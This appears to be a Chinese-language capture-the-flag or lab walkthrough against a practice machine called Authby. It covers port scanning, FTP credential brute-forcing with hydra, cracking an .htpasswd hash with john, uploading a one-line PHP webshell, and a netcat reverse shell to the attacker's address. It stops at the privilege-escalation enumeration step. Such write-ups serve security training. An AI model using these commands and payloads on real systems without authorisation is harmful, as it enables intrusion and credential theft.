使用nmap工具针对服务器192.168.115.46进行全端口扫描，使用工具命令如下：

```
sudo nmap -p- -vvv --min-rate 10000 192.168.115.46 -oX Authby.xml
```

截图扫描结果：

![image-20241106214955172](https://s2.loli.net/2024/11/06/aMhP3WNnEFz6w5J.png)

针对TCP的扫描我们获取到目标服务器共开放了四个端口，分别为21，242，3145、3389，针对这些开放的端口上运行的服务我们使用nmap工具进行进一步扫描，搜索更多可用的信息，并将输出结果保存为xml文件，相关执行命令如下

```
sudo nmap -p21,242,3145,3389 -A 192.168.115.46 -oX Authby.xml
```

扫描结果如下图

![image-20241106215815144](https://s2.loli.net/2024/11/06/xEfCbhmesLrYVRA.png)

在完成针对TCP的扫描后，我们针对UDP也进行扫描，仍然使用nmap工具进行扫描，相关扫描命令如下

```
sudo nmap -sU -p- --min-rate 10000 --open 192.168.115.46
```

![image-20241106220013345](https://s2.loli.net/2024/11/06/8YycbJZ9U6EDr7n.png)

没有UDP相关的扫描结果，所以我们在下一步针对TCP的端口进行攻击探测。

步骤一：21端口FTP服务

根据nmap扫描的结果，我们可以看到，目标服务器的FTP服务存在可以匿名化登录的情况，我们优先进行登录，将可以访问的文件内容进行下载后逐个进行查看，相应登录、查询、下载命令结果如下：

```
#登录目标ftp服务器
ftp 192.168.115.46 21
username：anonymous 
password：
```

![image-20241106220256932](https://s2.loli.net/2024/11/06/lMTcbKdfVBqhAR6.png)

```
#检查文件内容
dir
#下载相关文件（关闭交互）
prompt OFF
mget *
```

但我们经过上述的检查就会发现ftp目录所有的文件均为root权限，我们无法下载和操作，以防万一，我们还可以进行上传操作查看是否存在可能性；

```
put text.txt
```

通过匿名登录操作文件的方式行不通，但FTP内目前能看到确实存在较多的文件，考虑使用常用用户名密码进行下暴力破解尝试，我们使用kali自己的用户名字典和密码字典进行爆破，使用hydra工具，相应的攻击命令如下所示

```
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt  -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt ftp://192.168.115.46 -vV -f
```

![image-20241106231309914](https://s2.loli.net/2024/11/06/tEHqshwouv8jNlB.png)

然后我们发现了一堆可以登录的用户密码

user：admin

password：admin

我们使用这对账号密码进行登录，使用ftp命令，并输入用户密码

```
ftp 192.168.115.46 21
```

![image-20241106222951246](https://s2.loli.net/2024/11/06/GORzBKEfZjeT4rW.png)

发现了三个文件，我们针对这三个文件进行下载操作

```
#下载相关文件（关闭交互）
prompt OFF
mget *
```

![image-20241106223240853](https://s2.loli.net/2024/11/06/NDCvt4Sb6dJraqw.png)

三个文件实现了下载，我们要在本地对这些文件进行查看，在.htpasswd文件中我们发现一个意思密码哈希的内容

![image-20241106223516284](https://s2.loli.net/2024/11/06/osqvJPbBx9iIR2L.png)

针对这串内容，我们额外保存为文件hash.txt，尝试使用hashcat或者john这种工具进行破解，这里我们使用john工具，相关命令如下：

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![image-20241106223647806](https://s2.loli.net/2024/11/06/d8xy9eX4v3WAEwL.png)

破解得到一对用户密码，但我们目前暂时还不知道这对账号密码在哪使用

user：offsec

pass：elite

针对其他两个文件我们没有发现其他更值得的内容，针对FTP的探索暂时到这

端口2：242

242端口根据nmap的扫描结果这是一个http服务，我们在firefox中进行下访问

url:http://192.168.115.46:242/

![image-20241106224458685](https://s2.loli.net/2024/11/06/fLErqdPhv5JAOiQ.png)

要求认证，我们之前获取到一对用户密码，尝试在这边进行输入

![image-20241106224546267](https://s2.loli.net/2024/11/06/aCcOMtgN5fxXli2.png)

能够登录，展示的内容是之前我们在ftp中下载到的index.php页面，查询页面内容是一句意大利语言，我们尝试针对242端口的服务进行目录及文件遍历，这里我们使用dirsearch相关工具进行下扫描

```
dirsearch -u http://192.168.115.46:242/ -w /usr/share/wordlists/dirb/big.txt -f -e php,txt.html
```

但没有任何扫描结果，我们需要转换一个思路

既然我们看到的这个页面是ftp目录中的index.php，我们是否可以上传一个phpwebshell从而来实现shell反弹

我们优先编辑一个phpwebshell，我们编辑一个一句话木马

```
vi shell.php
```

```
<?php system($_GET["cmd"]); ?>
```

针对反弹回连的ip地址及端口进行修改

```
#上传webshell
put shell.php
#访问url链接
http://192.168.115.46:242/shell.php?cmd=whoami
```

![image-20241106230252646](https://s2.loli.net/2024/11/06/5bV63gDlOkyAIYW.png)

成功执行，那么我们就可以开始执行shell反弹，我们在https://www.revshells.com/上找一个powershell反弹命令

```
#攻击端开启侦听端口
sudo nc -nvlp 12345
#上传nc.exe
put nc.exe
#执行反弹
http://192.168.115.46:242/shell.php?cmd=nc.exe%20192.168.45.170%2012345%20-e%20cmd.exe
```

![image-20241106230957561](https://s2.loli.net/2024/11/06/IKZSdfoBGVFxWAE.png)

成功获取相应的shell，使用apache的账户进行登录，开始进行信息收集工作。

![image-20241106231210731](https://s2.loli.net/2024/11/06/bpjBzsXuAoUg976.png)

```
sudo python3 -m http.server 80
#上传文件
put winPEASany.exe

.\winPEASany.exe

```
